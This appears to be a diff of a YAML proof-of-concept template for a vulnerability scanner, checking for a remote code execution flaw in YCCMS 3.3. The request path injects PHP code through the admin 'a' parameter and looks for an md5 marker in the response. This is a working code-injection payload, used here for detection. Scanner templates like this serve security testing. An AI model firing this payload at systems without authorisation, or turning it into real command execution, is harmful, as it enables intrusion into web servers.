@@ -1,14 +1,12 @@
 name: poc-yaml-yccms33-rce
 set:
-  r1: randomLowercase(32)
-  r2: randomLowercase(32)
+  r1: randomInt(40000, 44800)
 rules:
   - method: GET
-    path: /admin/?a=Factory();printf('{{r1}}%%{{r2}}');//../
+    path: /admin/?a=Factory();print(md5({{r1}}));//../
     follow_redirects: false
     expression: |
-      status == 200 && body.bcontains(bytes(r1%r2))
-
+      body.bcontains(bytes(md5(string(r1))))
 detail:
   author: j4ckzh0u(https://github.com/j4ckzh0u)
   links:
